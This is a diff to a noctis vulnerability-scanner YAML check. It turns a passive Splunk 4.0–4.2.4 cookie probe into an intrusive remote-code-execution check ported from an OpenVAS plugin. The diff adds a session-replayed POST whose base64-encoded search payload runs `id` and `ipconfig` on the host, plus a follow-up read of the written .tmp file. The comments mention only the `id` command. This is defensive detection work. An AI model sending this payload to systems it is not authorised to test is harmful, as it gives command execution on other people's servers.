@@ -1,46 +1,57 @@
 # Splunk 4.0 - 4.2.4 Multiple Vulnerabilities — Active Check
 #
-# Splunk 4.0 through 4.2.4 is prone to multiple web-application
-# vulnerabilities (search-action CSRF/RCE, reflected XSS, and web-API
-# directory traversal). The exploit flow first requests the login page,
-# from which the server hands out an anonymous session cookie that the
-# subsequent crafted /en-GB/api/search/jobs request reuses.
+# Splunk 4.0 through 4.2.4 is prone to a search-action CSRF/RCE chain
+# (plus reflected XSS and web-API directory traversal). The active exploit
+# first requests the login page, from which the server hands out an anonymous
+# session cookie; that cookie (and the X-Splunk-Session token derived from it)
+# is reused on a crafted POST /en-GB/api/search/jobs whose `mappy`/`eval`
+# search payload writes the output of a shell command into a world-readable
+# static .tmp file. Reading that file back confirms code execution.
 #
-# Portable, non-destructive observable: an affected Splunk instance answers
-# /en-GB/account/login with a `Set-Cookie: session...;` header (the precondition
-# the active exploit relies on). The full command-execution chain
-# (authenticated search-job POST + write-then-read of a .tmp file) is not
-# reproducible with noctis's remote, unauthenticated primitives, so this feed
-# ports the faithfully-observable session-cookie signal the NASL extracts.
+# This feed ports that full chain faithfully from the source NASL:
+#   1. GET /en-GB/account/login, extract `Set-Cookie: session…` + its token.
+#   2. POST /en-GB/api/search/jobs with the NASL search body (Linux `id` ->
+#      .../exposed/js/.tmp), carrying the session cookie + X-Splunk-Session.
+#   3. GET the static .tmp path and match `uid=…gid=…`.
+# Only step 3 raises a finding — a bare session cookie is a precondition, not
+# proof, so it is deliberately NOT reported on its own (a cookie-only match
+# false-positives on any session-issuing server).
+#
+# The check is intrusive: it writes a file on the target (hence the `intrusive`
+# tag), mirroring the ACT_ATTACK category of the source plugin.
 #
 # Ported from OpenVAS/Greenbone NVT 2011/gb_splunk_multiple_vuln.nasl
-# (GPL-2.0-only). Detection pattern taken verbatim from that plugin.
+# (GPL-2.0-only). Request flow and payload taken from that plugin.
 uid: c8c19298-e8a0-4d9e-8089-cce22c1f89fe
 name: "Splunk 4.0 - 4.2.4 Multiple Vulnerabilities (Active Check)"
 description: |
-  Detects Splunk 4.0 through 4.2.4, affected by multiple web-application
-  vulnerabilities, by requesting /en-GB/account/login over a verbatim HTTP/1.0
-  request and matching the `Set-Cookie: session...;` header the server returns.
+  Detects Splunk 4.0 through 4.2.4, affected by a search-action CSRF/RCE chain
+  (CVE-2011-4642/4643/4644/4778). Requests the login page to obtain the
+  anonymous session cookie, replays it with its X-Splunk-Session token on a
+  crafted POST /en-GB/api/search/jobs that executes `id` and writes the result
+  to a static .tmp file, then reads that file back and matches `uid=…gid=…` to
+  confirm remote command execution.
 cves: [CVE-2011-4642, CVE-2011-4643, CVE-2011-4644, CVE-2011-4778]
 cvss: 9.3
 severity: critical
 confidence_base: 0.25
-tags: [splunk, web, csrf, rce, xss, directory-traversal]
+tags: [splunk, web, csrf, rce, xss, directory-traversal, intrusive]
 services: [http, https]
 author: noctis
-version: "1.0.0"
+version: "2.0.0"
 references:
   - "https://nvd.nist.gov/vuln/detail/CVE-2011-4642"
   - "https://nvd.nist.gov/vuln/detail/CVE-2011-4643"
   - "https://nvd.nist.gov/vuln/detail/CVE-2011-4644"
   - "https://nvd.nist.gov/vuln/detail/CVE-2011-4778"
   - "http://www.splunk.com/view/SP-CAAAGMM"
+  - "http://www.exploit-db.com/exploits/18245"
   # Source: OpenVAS/Greenbone NVT 2011/gb_splunk_multiple_vuln.nasl (GPL-2.0-only)
 
 steps:
-  # Request the Splunk login page with a verbatim HTTP/1.0 request so the raw
-  # Set-Cookie header is preserved in resp.banner (the exact signal the NASL
-  # reads via http_keepalive_send_recv on /en-GB/account/login).
+  # 1 — Request the login page with a verbatim HTTP/1.0 request so the raw
+  #     Set-Cookie header is preserved in resp.banner (the NASL reads it via
+  #     http_keepalive_send_recv on /en-GB/account/login).
   - id: login-probe
     action: tcp_connect
     port: "{{port}}"
@@ -48,14 +59,83 @@ steps:
     timeout_secs: 10
     store_as: login_resp
 
-  - id: session-match
+  # Pre-declare the vars the script fills, so conditions never touch an
+  # undefined Rhai variable (see CLAUDE.md pitfall) and the script's write-back
+  # has existing slots to update.
+  - id: init-session
+    action: set_var
+    var_name: session_cookie
+    var_value: ""
+
+  - id: init-xsplunk
+    action: set_var
+    var_name: xsplunk
+    var_value: ""
+
+  # 2a — Extract the session cookie and its token, exactly as the NASL does:
+  #      eregmatch("Set-Cookie: (session[^;]*);") then eregmatch("=([a-zA-Z0-9]+)").
+  - id: extract-session
+    action: script
+    code: |
+      let c = eregmatch("Set-Cookie:\\s*(session[^;]*);", login_resp.banner);
+      if c.len() > 1 { session_cookie = c[1]; }
+      let x = eregmatch("=([a-zA-Z0-9]+)", session_cookie);
+      if x.len() > 1 { xsplunk = x[1]; }
+      session_cookie
+    store_as: session_raw
+
+  # 2b — Replay the session on the crafted search-job POST. The body is the
+  #      NASL `exploit()` postData verbatim with the Linux command path
+  #      (`id` > .../search_mrsparkle/exposed/js/.tmp). Headers mirror the NASL
+  #      request: Cookie, X-Splunk-Session, X-Requested-With: XMLHttpRequest.
+  - id: search-job
+    action: http_request
+    method: POST
+    path: "/en-GB/api/search/jobs"
+    port: "{{port}}"
+    tls_insecure: true
+    follow_redirects: false
+    timeout_secs: 10
+    condition: "session_cookie != \"\""
+    headers:
+      Accept-Encoding: "identity"
+      X-Splunk-Session: "{{xsplunk}}"
+      Cookie: "{{session_cookie}}"
+      X-Requested-With: "XMLHttpRequest"
+      Content-Type: "application/x-www-form-urlencoded"
+    body: "search=search%20index%3D_internal%20source%3D%2Asplunkd.log%20%7Cmappy%20x%3Deval%28%22sys.modules%5B%27os%27%5D.system%28base64.b64decode%28%27aWQ%2BL29wdC9zcGx1bmsvc2hhcmUvc3BsdW5rL3NlYXJjaF9tcnNwYXJrbGUvZXhwb3NlZC9qcy8udG1waXBjb25maWc%2BImM6XHByb2dyYW0gZmlsZXNcc3BsdW5rXHNoYXJlXHNwbHVua1xzZWFyY2hfbXJzcGFya2xlXGV4cG9zZWRcanNcLnRtcCI%3D%27%29%29%22%29&status_buckets=300&namespace=search&ui_dispatch_app=search&ui_dispatch_view=flashtimeline&auto_cancel=100&required_field_list=*&earliest_time=&latest_time="
+    store_as: job_resp
+
+  # 3 — Give the dispatched search a moment to write the file, then read the
+  #     static .tmp path the payload targets (NASL: /en-US/static/@105575/js/.tmp).
+  - id: settle
+    action: sleep
+    duration_ms: 5000
+
+  - id: read-tmp
+    action: http_request
+    method: GET
+    path: "/en-US/static/@105575/js/.tmp"
+    port: "{{port}}"
+    tls_insecure: true
+    follow_redirects: false
+    timeout_secs: 10
+    condition: "session_cookie != \"\""
+    store_as: tmp_resp
+
+  # Only the executed-command output confirms the vulnerability — QoD 97.
+  - id: confirm-rce
     action: match
-    source: login_resp.banner
-    # Verbatim from the NASL: eregmatch(pattern: "Set-Cookie: (session[^;]*);", ...)
-    pattern: "Set-Cookie:\\s*session[^;]*;"
+    source: tmp_resp.body
+    # Verbatim from the NASL: egrep(pattern: "Subnet Mask|uid=[0-9]+.*gid=[0-9]+").
+    pattern: "uid=[0-9]+.*gid=[0-9]+"
+    condition: "session_cookie != \"\""
     on_match:
       finding:
+        title: "Splunk 4.0 - 4.2.4 search-action RCE (CVE-2011-4642/4643/4644/4778)"
+        description: "A crafted, session-replayed POST to /en-GB/api/search/jobs executed a shell command on the Splunk host and wrote its output to a world-readable static .tmp file, confirming the search-action CSRF/RCE chain affecting Splunk 4.0 through 4.2.4."
+        remediation: "Upgrade Splunk to 4.2.5 or later."
         confidence_delta: 0.70
         qod: 97
-        evidence: "Splunk session cookie returned by /en-GB/account/login: {{login_resp.banner}}"
+        evidence: "Command output recovered from /en-US/static/@105575/js/.tmp: {{tmp_resp.body}}"
       stop: true
